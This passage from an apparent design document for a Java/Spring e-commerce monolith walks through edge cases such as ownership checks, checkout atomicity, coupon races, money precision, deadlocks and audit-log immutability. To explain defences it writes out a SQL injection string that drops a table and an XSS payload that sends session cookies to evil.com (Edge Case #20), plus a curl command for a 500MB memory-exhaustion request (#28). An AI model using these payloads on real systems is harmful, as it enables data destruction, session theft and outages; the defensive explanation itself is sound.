  │◄─ 403 Forbidden ──────────────┤                               │
  │  "You don't own this resource"│                               │
```

### The Solution
```java
public void deleteAddress(UUID requestingUserId, UUID addressId) {
    AddressEntity address = addressRepo.findById(addressId)
        .orElseThrow(() -> new ResourceNotFoundException("Address", addressId));
    
    // BOLA check — must happen EVERY time, in the service layer
    if (!address.getUserId().equals(requestingUserId)) {
        // Return 403 (not 404) so the requester knows they're unauthorized
        throw new ForbiddenException("Access denied to address " + addressId);
    }
    
    addressRepo.delete(address);
}
```

**Why 403 and not 404?** Debate is ongoing in the security community. Returning 404
("resource not found") leaks no information about existence, which is slightly more
secure. But 403 gives a clearer signal to legitimate users ("wrong account") vs.
bots (who can enumerate both anyway). Our choice: 403 for better developer UX.

**Trade-off:** Every new endpoint that operates on user-owned resources must add this check.
It's easy to forget. Solution: a `@OwnershipRequired` AOP annotation that
automatically performs the check, removing the manual burden from each service method.

---

## Edge Case #17 — Checkout Atomicity (The Multi-Step Transaction)

### The Problem
Checkout involves multiple steps that must ALL succeed or ALL fail:
1. Validate cart items and prices
2. Reserve inventory (decrement stock)
3. Create order record
4. Apply coupon (decrement usage count)
5. Create payment record

If step 3 succeeds but step 4 fails (coupon error), the order exists but the coupon
wasn't applied — inconsistent state. If step 2 succeeds but step 5 fails, inventory
is decremented but no order exists — phantom inventory loss.

### Execution Flow

```
  ┌─────────────────────── Single @Transactional boundary ───────────────────────┐
  │                                                                               │
  │  1. validatePrices()      ──► price mismatch? → throw → ROLLBACK ALL         │
  │  2. reserveInventory()    ──► OOS? → throw → ROLLBACK ALL                    │
  │  3. createOrder()         ──► DB error? → throw → ROLLBACK ALL               │
  │  4. applyCoupon()         ──► invalid? → throw → ROLLBACK ALL (incl. steps 2,3)
  │  5. createPaymentRecord() ──► success → COMMIT ALL                           │
  │                                                                               │
  └───────────────────────────────────────────────────────────────────────────────┘

  If ANY step throws, the transaction rolls back ALL previous steps atomically.
  The DB returns to the exact state it was in before checkout started.
```

### The Solution
```java
@Transactional(timeout = 10)  // release connection if stuck > 10s (see Edge Case #24)
public CheckoutResponse checkout(UUID userId, CheckoutRequest req) {
    // All steps in one transaction — either all commit or all rollback
    validatePrices(req.cartItems());
    reserveInventory(req.cartItems());
    OrderEntity order = createOrder(userId, req);
    if (req.couponCode() != null) applyCoupon(req.couponCode(), userId, order);
    PaymentEntity payment = createPaymentRecord(order);
    publishOrderCreatedEvent(order);  // outbox write in same TX (Edge Case #11)
    return buildResponse(order, payment);
}
```

**Trade-off:** A single long transaction holds DB connections and locks throughout all steps.
With a slow inventory check (step 2), the connection is held while that query runs.
The `timeout = 10` prevents this from hanging forever. For systems with >1000 concurrent
checkouts, consider the Saga pattern (compensating transactions) for horizontal scaling —
but Saga is significantly more complex to implement and debug.

---

## Edge Case #18 — Notification Deduplication

### The Problem
The Outbox poller (Edge Case #11) guarantees "at-least-once" delivery — it will retry
until it confirms the notification was sent. This means the notification service might
receive the same event multiple times:
- First delivery: notification sent successfully, but the "mark as published" DB update fails → retry
- Second delivery: notification sent again → user gets two "Your order was placed!" emails

### Execution Flow

```
Outbox Poller                    Notification Service           DB
  │                               │                              │
  ├─ Deliver event (orderId=99) ──►│                              │
  │                               ├─ SELECT notification_id ────►│
  │                               │  WHERE type='ORDER' AND      │
  │                               │  reference_id='99'           │
  │                               │◄─ (no rows) ─────────────────┤
  │                               ├─ send email ✓                │
  │                               ├─ INSERT INTO notifications ──►│
  │                               │  (type, reference_id, ...)   │
  │                               │◄─ OK ────────────────────────┤
  │◄─ Ack ────────────────────────┤                              │
  │  [poller "mark published"     │                              │
  │   update fails — retries]     │                              │
  │                               │                              │
  ├─ Deliver event (orderId=99) ──►│  (RETRY — same event)        │
  │                               ├─ SELECT notification_id ────►│
  │                               │◄─ (row found!) ──────────────┤
  │                               │  → skip — already sent ✓     │
  │◄─ Ack ────────────────────────┤                              │
```

### The Solution
```java
// 1. DB-level uniqueness prevents duplicates even under race conditions:
// UNIQUE(notification_type, reference_id)

// 2. Application-level idempotency check (fast path — avoids DB write on duplicate):
public void sendOrderConfirmation(UUID orderId) {
    if (notificationRepo.existsByTypeAndReferenceId("ORDER_CONFIRMED", orderId)) {
        log.debug("Notification already sent for order {}, skipping", orderId);
        return;
    }
    emailProvider.send(buildEmail(orderId));
    notificationRepo.save(buildNotificationRecord(orderId));
}
```

**Trade-off:** Still "at-least-once" — if the `save()` fails after `emailProvider.send()`,
the email was sent but not recorded. The next delivery sends a second email.
True "exactly-once" notification requires two-phase commit between the app and the email
provider — which no email provider supports. Accept "at-least-once" and keep retry
intervals long enough that duplicate emails are rare (not every 30 seconds).

---

## Edge Case #19 — Graceful Shutdown (Zero Downtime Deploys)

### The Problem
A new version is deployed. The old server process receives `SIGTERM`. Without graceful
shutdown, the JVM exits immediately:
- 50 in-flight checkout requests → mid-transaction kill → partial writes → data corruption
- Payment callbacks arrive → 502 Bad Gateway → gateway retries indefinitely
- Long-running reports → incomplete results saved to DB

### Execution Flow

```
Load Balancer               Old Server (shutting down)         New Server (starting)
  │                               │                               │
  │  [Deploy triggered]           │                               │
  │                               │◄─── SIGTERM ──────────────────┤
  │                               │                               │
  │                               │  1. Stop accepting new conns  │
  │                               │     (HTTP listener closes)    │
  │                               │                               │
  │  [New requests → new server]  │  2. Wait for in-flight        │
  │  ─────────────────────────────────────────────────────────────►│
  │                               │     requests to complete     │
  │                               │     (max 30 seconds)         │
  │                               │                               │
  │                               │  3. In-flight requests finish │
  │  [Old server still serving    │     ← 15 seconds later ─────  │
  │   existing connections]       │                               │
  │                               │  4. JVM exits cleanly ✓      │
```

### The Solution
```yaml
# application.yml
server:
  shutdown: graceful  # Spring Boot 2.3+ — waits for active requests

spring:
  lifecycle:
    timeout-per-shutdown-phase: 30s  # max wait time
```

```java
// Scheduled jobs: respond to shutdown signal
@Scheduled(fixedDelay = 500)
public void pollOutbox() {
    if (!running) return;  // stop processing immediately on shutdown signal
    // ... process outbox messages
}

@PreDestroy
public void onShutdown() {
    this.running = false;
}
```

**Trade-off:** Slow in-flight requests delay the shutdown (up to `timeout-per-shutdown-phase`).
During a deploy, the old server might stay alive for 30 seconds while serving long-running
requests. For most web APIs (sub-second responses), shutdown completes in milliseconds.
For long-running batch jobs, add explicit interrupt handling.

---

## Edge Case #20 — Input Sanitization (SQL Injection + XSS Prevention)

### The Problem
Unsanitized user input is the #1 cause of web application vulnerabilities (OWASP):

**SQL Injection:**
```
Product search: ?q=laptop'; DROP TABLE products; --
Naive query:    "SELECT * FROM products WHERE name = 'laptop'; DROP TABLE products; --'"
Result:         products table deleted
```

**Cross-Site Scripting (XSS):**
```
Product review: "<script>document.location='https://evil.com?cookie='+document.cookie</script>"
If stored and rendered unescaped: steals every user's session cookie who views the review
```

### Execution Flow

```
Attacker                        App                              DB
  │                               │                               │
  ├─ POST /reviews ───────────────►│                               │
  │  {content: "<script>steal()"}  │                               │
  │                               ├─ @Valid validates fields      │
  │                               ├─ @Size(max=2000) ✓            │
  │                               ├─ sanitize HTML entities:      │
  │                               │  "<" → "&lt;"                 │
  │                               │  ">" → "&gt;"                 │
  │                               ├─ INSERT INTO reviews ─────────►│
  │                               │  (parameterized query) ✓     │
  │                               │  content = "&lt;script&gt;..." │
  │                               │                               │
  │  [Victim views review page]   │                               │
  │                               │  Renders: <script>steal()    │
  │                               │  as literal text — harmless ✓ │
```

### The Solution — Four Layers

**Layer 1 — Parameterized queries (Spring Data JPA default):**
```java
// WRONG (string concatenation):
String sql = "SELECT * FROM products WHERE name = '" + userInput + "'";

// RIGHT (parameterized — Spring Data JPA default):
productRepo.findByName(userInput);
// → Hibernate: SELECT * FROM products WHERE name = ?  [userInput bound separately]
```
The `?` placeholder tells the DB driver: "this is data, never code." SQL injection is
structurally impossible.

**Layer 2 — Bean Validation (`@Valid`):**
```java
public record SearchRequest(
    @NotBlank @Size(max = 200) String query,
    @Min(0) @Max(10000) BigDecimal maxPrice
) {}
```

**Layer 3 — HTML sanitization for stored content (reviews, descriptions):**
```java
// Using OWASP Java HTML Sanitizer or Jsoup:
String safeContent = Jsoup.clean(userInput, Safelist.basic());
```

**Layer 4 — Security headers (HTTP response headers):**
```
Content-Security-Policy: default-src 'self'   ← blocks external script loading
X-Content-Type-Options: nosniff               ← prevents MIME sniffing attacks
X-Frame-Options: DENY                         ← blocks clickjacking
```

**Trade-off:** Validation adds latency (microseconds — negligible). HTML sanitization
may strip legitimate formatting (e.g., markdown in product descriptions). Solution:
use a whitelist-based sanitizer (`Safelist.basic()`) that allows harmless tags (`<b>`, `<i>`,
`<a href>`) while blocking all script-related elements.

---

## New Cases #21–#30 (Senior / Principal Level)

---

## Edge Case #21 — Coupon Race Condition (Multi-use Coupon Exhaustion)

### The Problem
"First 100 customers get 20% off." This sounds simple. It's one of the hardest correctness
problems in e-commerce. Without protection:

- 500 users simultaneously apply the coupon
- All 500 read `used_count = 99` (less than `max_uses = 100`)
- All 500 pass the "is valid?" check
- All 500 successfully use the coupon
- `used_count` ends up at... **anywhere from 100 to 599** depending on race conditions

You just gave away 500 discounts instead of 100. Depending on the discount value, this could
be a significant financial loss. The mistake is undetectable without careful monitoring.

### Why It's Hard
Unlike inventory (one unique product), coupons have a **shared counter** that any of thousands
of users can increment simultaneously. Every naive implementation has a race condition window.

### Our Solution — 3-Layer Defense

**Layer 1 — Pre-flight (fast rejection):**
Check expiry, active status, per-user limit, minimum order amount.
Eliminates obviously invalid requests before hitting the atomic increment.
Does NOT prevent race conditions — it's just an optimization.

**Layer 2 — Atomic SQL increment (the real guard):**
```sql
UPDATE coupons
SET used_count = used_count + 1
WHERE id = :couponId
  AND is_active = true
  AND (max_uses IS NULL OR used_count < max_uses)
  AND valid_from <= NOW()
  AND valid_until > NOW()
```
This is the same pattern as Edge Case #14 (flash sale inventory). The `WHERE` clause check
and the `used_count` increment are a single atomic DB operation. Returns 0 if the coupon is full.

**Layer 3 — UNIQUE(coupon_id, user_id) in `coupon_usages`:**
If the same user submits two concurrent requests that both pass Layer 2, only one `INSERT` into
`coupon_usages` succeeds. The second gets `DataIntegrityViolationException` → caught → the
transaction rolls back (which also undoes the Layer 2 increment, since it's the same TX).

### Why This Approach?

**Alternative: SELECT ... FOR UPDATE on the coupon row**
> "Lock the entire coupon row during usage."

❌ **Serializes ALL coupon applications globally.** If 1000 users try simultaneously, they all queue
behind a single lock. Throughput: 1 coupon application at a time. Under a flash sale, this causes
massive timeout failures. The atomic SQL approach allows the DB to handle concurrency efficiently
at the row level without full serialization.

**Alternative: Application-level `synchronized(couponId.toString().intern())`**
> "Lock on the coupon code string in the JVM."

❌ **Only works on one JVM instance.** With any horizontal scaling (2+ app servers), each JVM
has its own locks. Race condition is back.

**Trade-off: The "lost decrement" edge case**
If Layer 2 increments but Layer 3 throws (DB constraint violation → rollback), the increment
is rolled back too (same transaction). This is correct — we never leave a phantom increment.
However, the rollback itself must not fail. Always ensure the datasource is not in a bad state.

**Code:** [`CouponRepository.atomicIncrementUsage()`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/coupon/repository/CouponRepository.java) | [`CouponService`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/coupon/service/CouponService.java)

---

## Edge Case #22 — Money Arithmetic Precision

### The Problem
This is the single most underrated bug category in e-commerce. Money bugs are silent,
accumulate slowly, and are noticed during financial reconciliation — months later.

```java
// THE WRONG WAY (actual Java output):
double a = 0.1 + 0.2;            // = 0.30000000000000004 ← NOT 0.3
double tax = 999.99 * 0.1;       // = 99.99899999999999  ← should be 100.00
double total = 10.005 * 3;       // = 30.014999999999997 ← rounds wrong
```

**The split-cent problem:**
If 1000 orders of $10.005 each, and you round down consistently → you collect $10,000 instead of
$10,005 → $5 shortfall in tax revenue. Tax authorities notice. Audits are not fun.

**The accumulation problem:**
Sum 1000 prices with floating-point arithmetic → accumulated error of $0.001–$0.10 depending
on the values. Not visible in a single transaction. Visible at monthly settlement.

### Our Solution — `MoneyUtils`

```java
// THE RIGHT WAY:
BigDecimal price = new BigDecimal("999.99");
BigDecimal taxRate = new BigDecimal("10");
BigDecimal tax = MoneyUtils.percentage(price, taxRate);   // = 100.00 exactly
```

Rules enforced by `MoneyUtils`:
1. **Always `BigDecimal`** — never `double` or `float` for monetary values
2. **Always explicit scale** (2 decimal places for currency)
3. **Always `HALF_UP` rounding** — the legally standard financial rounding mode
4. **High intermediate precision** — compute at 6+ decimal places, round only at the final step
5. **`compareTo()` not `equals()`** for comparison — `100.0.equals(100.00)` returns false!

### Why This Approach?

**Alternative: Round at every step**
> "Always keep 2dp throughout all calculations."

❌ **Accumulates rounding errors.** Each intermediate rounding loses precision, and those losses
stack. Industry practice: keep full precision internally, round only at the API boundary (what you
show to users) and at the write boundary (what you store).

**Alternative: Store money as integers (cents)**
> "Store $10.99 as `1099` (cents). No decimal issues."

✅ **Valid and common.** Stripe uses this internally. Avoids floating-point entirely.
Downside: every display layer must divide by 100. Multi-currency complicates things (JPY has 0
decimal places; KWD has 3). Requires careful handling at the boundary.

Our approach: `BigDecimal` with explicit scale is more readable and handles multi-currency naturally.

**Trade-off: BigDecimal is slower than double**
BigDecimal arithmetic is ~10-100× slower than IEEE 754 double. For a checkout with 50 items,
this is microseconds — completely irrelevant. Never use `double` to "optimize" financial calculations.

**Code:** [`MoneyUtils.java`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/infrastructure/util/MoneyUtils.java)

---

## Edge Case #23 — N+1 Query Problem

### The Problem
The most common performance killer that looks fine in development and breaks in production.

```java
// LOOKS INNOCENT:
List<Order> orders = orderRepo.findByUserId(userId);  // 1 query: SELECT * FROM orders
for (Order o : orders) {
    o.getItems();  // LAZY LOAD: 1 query per order → N queries
}
// With 20 orders: 1 + 20 = 21 queries per request
// With 100 concurrent users: 2100 queries/second
// Database CPU: 100%
```

This never shows up in unit tests (mocked repos) or development (tiny datasets).
It destroys production systems at scale.

### Our Solution — Two-Query Pagination Pattern

**Naive JOIN FETCH with pagination (WRONG):**
```java
// THIS TRIGGERS HHH90003004 WARNING:
@Query("SELECT DISTINCT o FROM OrderEntity o LEFT JOIN FETCH o.items WHERE o.userId = :uid")
Page<OrderEntity> findWithItems(UUID uid, Pageable pageable);
```
Hibernate cannot apply SQL LIMIT with JOIN FETCH — it fetches ALL rows in memory, then paginates in Java.
With 10,000 orders, this loads all 10,000 into memory for every page request.

**Correct: Two-query pattern:**
```java
// Query 1: paginated IDs only (fast, no join, DB-level LIMIT)
Page<UUID> ids = orderRepo.findOrderIdsByUserId(userId, pageable);

// Query 2: full objects with items for ONLY the current page (no pagination needed)
List<OrderEntity> orders = orderRepo.findByIdsWithItems(ids.getContent());
```
Total: 2 queries regardless of total order count. Memory: only current page in memory.

### Why This Approach?

**Alternative: Use DTOs with @NamedEntityGraph**
> "Declare an entity graph to specify what to eagerly load."

✅ **Also valid.** Entity graphs are more declarative. But they're verbose and can be hard
to compose for complex cases. The two-query pattern is explicit, easy to understand, and more
flexible for varying load requirements per endpoint.

**Alternative: Make items EAGER fetch always**
> "Just add `fetch = FetchType.EAGER` on the items collection."

❌ **NEVER.** Eager fetch on collections runs the N+1 problem automatically on every load of
the parent entity — even when you don't need the items. You've made N+1 permanent and hidden.

**Alternative: Use `@BatchSize(size = 20)` on the collection**
> "Hibernate batches lazy loads: 20 at a time instead of 1 at a time."

✅ **Simple fix that helps.** Instead of N queries, you get ceil(N/20) queries.
Still N+1 in nature but much less damaging. Good as a fallback safety net (`@BatchSize`
on the entity class or collection globally).

**Trade-off: Two-query loses total count for pagination**
The first query returns a `Page<UUID>` which includes total count (for "Page X of Y" UI).
The second query returns a list. You reconstruct the page manually. Slightly more code,
but correctness and performance are non-negotiable.

**Code:** [`OrderRepository.findOrderIdsByUserId() + findByIdsWithItems()`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/order/repository/OrderRepository.java)

---

## Edge Case #24 — Database Connection Pool Exhaustion

### The Problem
`HikariPool-1 - Connection is not available, request timed out after 30000ms.`

This error means ALL database connections are in use. Every new request waits in a queue.
After 30 seconds, it gives up → the user gets a 500 error.

**Root causes (in order of frequency):**
1. **Long-running transactions** holding connections while waiting for external calls
   (e.g., a payment gateway call INSIDE a `@Transactional` method)
2. **Slow queries** without indexes (a full table scan on 1M rows holds a connection for seconds)
3. **Connection leaks** — code that opens connections and never closes them
4. **Pool sized too small** for the actual workload

**Why it cascades:**
One slow request holds a connection → queue fills → all requests wait → more connections needed
→ all exhausted → all requests time out → retries start → even more load → **complete outage**

### Our Solution — Four Defenses

**Defense 1 — Tight connection timeout (fail fast):**
```yaml
hikari:
  connection-timeout: 3000  # 3 seconds, not 30
```
When the pool is exhausted, fail fast. The user gets an error in 3 seconds, not 30.
A fast 503 is better than a frozen browser. Also limits cascading load from hung requests.

**Defense 2 — Leak detection threshold:**
```yaml
hikari:
  leak-detection-threshold: 10000  # warn if held > 10 seconds
```
Logs a stack trace showing WHERE the connection was acquired. Finds leaks immediately.

**Defense 3 — `@Transactional(timeout=10)` on slow operations:**
```java
@Transactional(timeout = 10)  // release connection if stuck > 10 seconds
public CheckoutResponse checkout(...) { ... }
```
If the checkout takes > 10 seconds (e.g., DB lock wait), Spring rolls back and throws.
The connection is released. The user gets a clean error. Other users are unaffected.

**Defense 4 — Never make external HTTP calls inside a transaction:**
```java
// WRONG:
@Transactional
public void processPayment() {
    saveOrder();          // holds DB connection...
    paymentGateway.charge();  // ...while making HTTP call to external service (may take seconds)
    savePaymentResult();
}

// RIGHT: Commit DB changes first, THEN call external service
public void processPayment() {
    saveOrderInItsOwnTransaction();   // connection released after commit
    paymentGateway.charge();          // external call with no connection held
    savePaymentResultInNewTransaction();
}
```

### Why This Approach?

**Alternative: Just increase pool size**
> "Set `maximum-pool-size: 200` and the problem goes away."

❌ **Treats the symptom, not the cause.** And creates new problems: PostgreSQL has a default
`max_connections=100`. Exceeding it crashes the DB. More connections also mean more memory and
more lock contention. The right pool size is small (10-30) with fast transactions.

**Alternative: Connection per request (old servlet model)**
❌ **What we had before connection pools.** 1000 concurrent users = 1000 DB connections. Each
PostgreSQL connection uses ~5MB RAM → 5GB for connection management alone. Unusable.

**Trade-off: Tight timeout rejects legitimate slow operations**
A 10-second timeout will occasionally reject valid requests that happen to be slow (DB under load
during a sale). Mitigation: monitor P99 latency; set timeout to 3-5× the P99.

**Code:** [`application.yml hikari config`](../ecommerce-monolith/src/main/resources/application.yml)

---

## Edge Case #25 — Database Deadlock Detection and Consistent Lock Ordering

### The Problem
```
T1: SELECT ... FOR UPDATE WHERE product_id = 'A'  ← locks A
T2: SELECT ... FOR UPDATE WHERE product_id = 'B'  ← locks B
T1: SELECT ... FOR UPDATE WHERE product_id = 'B'  ← waits (T2 has B)
T2: SELECT ... FOR UPDATE WHERE product_id = 'A'  ← waits (T1 has A)
DEADLOCK. PostgreSQL kills T2. T2 gets: ERROR 40P01: deadlock detected.
```

In e-commerce: User X orders [Product-A, Product-B]. User Y orders [Product-B, Product-A].
If inventory is reserved in arbitrary order, this deadlock happens regularly under concurrent load.

### Our Solution — Two Complementary Fixes

**Fix 1 — Consistent Lock Ordering (prevents deadlocks):**
Always sort products by UUID before acquiring locks:
```java
List<OrderItemEntity> items = order.getItems().stream()
    .sorted(Comparator.comparing(i -> i.getProductId().toString()))
    .toList();
// Now both T1 and T2 always lock A first, then B → no circular dependency
```
If T1 and T2 both lock A first, T2 waits at A while T1 completes both locks and commits.
No cycle → no deadlock.

**Fix 2 — `DeadlockRetryTemplate` (catches residual deadlocks):**
Even with lock ordering, deadlocks can occur from index locks, constraint checks, and
PostgreSQL's internal page-level locking. Always have a retry layer:
```java
return DeadlockRetryTemplate.execute("checkout", () -> checkoutService.performCheckout(userId, req));
```
The template catches `CannotAcquireLockException` / `DeadlockLoserDataAccessException`
(Spring's wrappers for PostgreSQL `40P01`) and retries with jittered exponential backoff.

### Why This Approach?

**Alternative: `SERIALIZABLE` transaction isolation**
> "Use the highest isolation level — PostgreSQL handles deadlocks automatically."

❌ **Massive performance cost.** SERIALIZABLE adds significant overhead and causes many more
transaction aborts (serialization failures). Under high concurrency, 30-50% of transactions
may abort and retry. Acceptable for financial audits; catastrophic for e-commerce checkout.
`READ COMMITTED` + explicit `FOR UPDATE` gives us the same correctness with much better throughput.

**Alternative: Application-level locking (Redis)**
> "Acquire a Redis lock on `inventory:{productId}` before each reservation."

✅ **Avoids DB deadlocks entirely.** But: Redis lock expiry creates new edge cases (what if
the lock expires mid-reservation?). DB-level locking is simpler and automatically released
on transaction commit/rollback.

**Trade-off: Retry adds latency**
A deadlock victim must retry the entire transaction. Under load, this adds 30–300ms per retried
request. This is acceptable — deadlocks are rare under correct lock ordering.

**Code:** [`DeadlockRetryTemplate.java`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/infrastructure/resilience/DeadlockRetryTemplate.java)

---

## Edge Case #26 — Dead Letter Queue for Outbox

### The Problem
The Outbox pattern retries failed events. But what happens after the 5th retry?

**Option A — Delete the failed message:**
The event is silently lost forever. A customer never received their order confirmation email.
They have no idea the order succeeded. They call support. Support has no record of the email.

**Option B — Keep retrying forever:**
The outbox poller continuously processes the same failing message. DB load increases.
The `next_retry_at` exponential backoff helps, but eventually this message is being polled
every 10 minutes for the next year. Operational noise drowns out real issues.

**Option C — Dead Letter Queue:**
Move it to a separate `dead_letter_messages` table. Alert operations. Replay when fixed.

### Our Solution

When an outbox message exhausts its max retries (default: 5), the poller:
1. Creates a `DeadLetterMessageEntity` from the failed `OutboxMessageEntity`
2. Marks the outbox message as published (stops polling it)
3. Deletes or archives the original outbox row

Operations can:
- Query `dead_letter_messages` to see all permanently failed events
- Understand the `failure_reason` to fix the root cause
- Call the admin `/admin/dlq/{id}/replay` endpoint to replay specific messages
- Set up monitoring on `SELECT COUNT(*) FROM dead_letter_messages WHERE replayed_at IS NULL`

### Why This Approach?

**Alternative: Alert + leave in outbox_messages**
> "Set a flag `status='DLQ'` on the outbox row and alert when count > 0."

✅ **Simpler — no separate table.** But pollutes the active polling query's result set.
The poller must filter out DLQ-status rows on every poll cycle — extra query complexity.
Separate table is cleaner and allows different retention policies.

**Alternative: Kafka Dead Letter Topic**
> "Publish failed events to a `dlq-topic` Kafka topic."

✅ **Standard in distributed systems.** But this is a monolith — no Kafka. Adding Kafka just
for the DLQ defeats the simplicity we gained from going monolith.

**Trade-off: Manual replay is required**
DLQ messages require human intervention to investigate and replay. This is a feature, not a bug —
permanent failures indicate a real problem (broken email provider, bad event data) that should
not be automatically retried. An automatic retry after fixing the root cause IS supported via
the replay endpoint.

**Code:** [`DeadLetterMessageEntity`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/infrastructure/outbox/DeadLetterMessageEntity.java) | [`V2__add_coupons_dead_letter_table.sql`](../ecommerce-monolith/src/main/resources/db/migration/V2__add_coupons_dead_letter_table.sql)

---

## Edge Case #27 — Clock Safety and Always-UTC Timestamps

### The Problem
Timestamps are a frequent source of subtle, intermittent bugs:

**DST (Daylight Saving Time) cliff:**
A flash sale runs "from midnight to midnight." What midnight? Server timezone?
User timezone? During the DST transition at 2am (clocks go back to 1am), does the hour
between 1am and 2am run twice? Does your coupon expire twice? Does it never expire?

**`LocalDateTime` has no timezone:**
```java
LocalDateTime expires = LocalDateTime.of(2024, 3, 10, 2, 0);  // 2am — but which 2am?
```
If your server moves timezones (cloud migration, AWS region change), all your stored timestamps
shift by the offset. Reservation TTLs that were 30 minutes are now 24.5 hours or -23.5 hours.

**Replication lag + timezone:**
Write goes to primary (PST), read comes from replica (UTC). If timestamps are stored without TZ
info, the comparison `WHERE expires_at > NOW()` behaves differently on each server.

### Our Solution

1. **Use `java.time.Instant` everywhere** — Instant is always UTC epoch nanoseconds. No timezone info to get wrong.
2. **Store as `TIMESTAMPTZ` in PostgreSQL** — the `Z` means "with timezone." PostgreSQL stores UTC internally.
3. **Force Jackson to serialize as ISO-8601 UTC** — `"2024-03-10T02:00:00Z"` not `"2024-03-10 02:00:00"`.
4. **Force Hibernate to use UTC JDBC timezone** — `hibernate.jdbc.time_zone: UTC`
5. **API accepts ISO-8601 with timezone** — clients specify their timezone; server converts to UTC.

```java
// WRONG — no timezone, will break on DST:
LocalDateTime expiresAt = LocalDateTime.now().plusMinutes(30);

// RIGHT — always UTC, never ambiguous:
Instant expiresAt = Instant.now().plus(Duration.ofMinutes(30));
```

### Why This Approach?

**Alternative: Store server-local time, display in user's timezone**
❌ **The fundamental mistake.** Storing without timezone and converting on read is a one-way door to bugs.
When server timezone changes (and it will — region migration, cloud infra) all stored times shift.

**Alternative: Let the DB handle it (use `NOW()` in queries)**
✅ **Complement, not alternative.** `NOW()` in PostgreSQL always returns UTC when `timezone='UTC'`
(which our Hikari connection sets). Good for `DEFAULT NOW()` in DDL. But Java code still needs
`Instant` for type safety.

**Trade-off: UTC confuses business users**
"Why does my report say the sale ended at 16:00? It ended at midnight!" — Because midnight Pacific
is 08:00 UTC the next day. **Solution:** convert to local time at the DISPLAY layer only. Store UTC,
display local. Never store local.

**Code:** [`application.yml spring.jackson.time-zone: UTC`](../ecommerce-monolith/src/main/resources/application.yml) | All entity `Instant` fields

---

## Edge Case #28 — Large Payload Protection

### The Problem
A malicious user (or a buggy client) sends a 500MB JSON body to your checkout endpoint:

```bash
curl -X POST https://api.ecommerce.com/orders/checkout \
  -d "$(python3 -c "print('X'*500_000_000)")"
```

Without limits:
1. Tomcat reads all 500MB into memory
2. Jackson tries to deserialize 500MB of JSON
3. JVM heap exhausts → `OutOfMemoryError`
4. JVM crashes OR garbage collector runs constantly at 100% CPU
5. **Every user on the same JVM is affected — total outage**

This is an **amplification attack**: 1 request by 1 attacker can take down the service for
all users. HTTP servers process requests before authentication — an unauthenticated attacker
can do this.

### Our Solution

**Layer 1 — Tomcat max-swallow-size:**
```yaml
server:
  tomcat:
    max-swallow-size: 2MB
```
If the request body exceeds 2MB, Tomcat rejects the connection during read — before Jackson
even tries to deserialize. Memory impact: only the first 2MB are read.

**Layer 2 — Spring MVC content length validation:**
```yaml
spring:
  servlet:
    multipart:
      max-request-size: 10MB
```

**Layer 3 — `@Size` on all request fields:**
```java
public record CheckoutRequest(
    @Size(max = 500) String notes,     // prevents giant notes
    @Size(max = 64)  String idempotencyKey
) {}
```
Even if a 1MB body passes Layer 1 (it's under 2MB), field-level size validation rejects
payloads with excessively long field values.

### Why This Approach?

**Alternative: Reject at the load balancer/WAF**
✅ **Best practice — defense in depth.** Cloudflare/AWS WAF has payload size limits too.
But you cannot ONLY rely on the WAF — direct access to the server (internal network, security
test, WAF misconfiguration) bypasses it. Application-level limits are the last line of defense.

**Alternative: Stream parsing**
> "Use streaming JSON parsing (Jackson streaming API) — never load full body into memory."

✅ **Most memory-efficient.** Streaming parsers process the body token by token.
But requires significant complexity — you lose the convenience of `@RequestBody`. 
The `max-swallow-size` limit achieves the same protection with zero code change.

**Trade-off: Legitimate large uploads rejected**
If you add a product image upload endpoint, 2MB is too small (images can be 5-10MB).
Use separate size limits per endpoint — multipart uploads get their own `max-request-size`.
The 2MB limit is for JSON API endpoints only.

**Code:** [`application.yml server.tomcat.max-swallow-size`](../ecommerce-monolith/src/main/resources/application.yml)

---

## Edge Case #29 — Audit Log Immutability

### The Problem
Audit logs are only useful if you can trust them. If they can be modified:
- A developer accidentally runs `UPDATE order_status_history SET to_status='COMPLETED'` to "fix" data
- A rogue employee deletes payment history to cover fraud
- A bug in a migration script wipes audit records
- In a compliance audit: auditor asks "prove this order was never completed" — you can't

**Financial compliance requirement:** In Vietnam and most countries, financial transaction records
must be kept for 7+ years and must be tamper-proof.

### Our Solution — Three Layers of Immutability

**Layer 1 — Hibernate `@Immutable`:**
```java
@Entity
@Immutable  // Hibernate NEVER generates UPDATE for this entity
public class OrderStatusHistoryEntity { ... }
```
Even `historyRepo.save(existingRecord)` with changes → Hibernate silently ignores the changes.
No exception, no update. Structurally impossible to accidentally update via JPA.

**Layer 2 — No setter methods:**
The class has no setters. You cannot modify it in code without reflection.
Factory method `of(...)` is the only way to create records.

**Layer 3 — PostgreSQL Row Level Security:**
```sql
ALTER TABLE order_status_history ENABLE ROW LEVEL SECURITY;

CREATE POLICY audit_deny_update ON order_status_history FOR UPDATE USING (false);
CREATE POLICY audit_deny_delete ON order_status_history FOR DELETE USING (false);
```
Even direct SQL (bypassing the application) cannot modify or delete audit records.
Only a user with `BYPASSRLS` role can override this — that action is itself logged.

### Why This Approach?

**Alternative: Append-only Kafka topic**
> "Write audit events to Kafka. Topics are append-only by design."

✅ **Excellent for append-only at scale.** But Kafka topics can have retention policies that
delete old messages. And we've removed Kafka from this architecture. A DB table with RLS policies
is simpler and sufficient for a monolith.

**Alternative: Blockchain/cryptographic chaining**
> "Hash each record with the previous record's hash, like a blockchain."

✅ **Tamper-evident even if the DB is compromised.** Used by some banking and healthcare systems.
Enormous complexity for most e-commerce needs. PostgreSQL RLS + role separation is sufficient
for commerce compliance.

**Alternative: Separate "audit database" with read-only app credentials**
> "The app has INSERT-only access to the audit DB — it literally cannot UPDATE."

✅ **Strong separation.** But requires infrastructure management of a second DB.

**Trade-off: Cannot fix incorrect audit records**
If a bug writes a wrong status transition to the history, you cannot fix it. The record stands
as-is (incorrect, but immutable). Mitigation: add a `correction_note` column that CAN be updated
(not a status change — just a human note explaining the error). The wrong record stays; the
correction is annotated. This preserves audit integrity while allowing explanation.

**Code:** [`OrderStatusHistoryEntity @Immutable`](../ecommerce-monolith/src/main/java/com/ecommerce/monolith/domain/order/entity/OrderStatusHistoryEntity.java) | [`V2__add_coupons_dead_letter_table.sql (RLS policies)`](../ecommerce-monolith/src/main/resources/db/migration/V2__add_coupons_dead_letter_table.sql)

---

## Edge Case #30 — Partial Fulfillment Policy

